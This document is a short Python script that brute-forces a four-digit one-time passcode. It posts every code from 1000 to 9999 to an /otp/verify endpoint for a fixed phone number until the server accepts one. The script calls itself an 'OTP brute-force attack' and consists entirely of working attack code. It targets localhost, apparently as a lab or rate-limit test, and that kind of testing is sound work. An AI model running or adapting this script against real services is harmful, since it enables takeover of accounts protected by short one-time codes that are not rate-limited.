import requests

BASE_URL = "http://localhost:3000"
PHONE = "+306900000099"

print("Starting OTP brute-force attack...\n")

for code in range(1000, 10000):

    otp = str(code)

    payload = {
        "phone": PHONE,
        "otp": otp
    }

    response = requests.post(
        f"{BASE_URL}/otp/verify",
        json=payload
    )

    if response.status_code == 200:
        print("\nOTP FOUND")
        print(f"OTP: {otp}")
        print(f"Attempts: {code - 999}")
        print(response.json())
        break

    if code % 500 == 0:
        print(f"Tested up to: {otp}")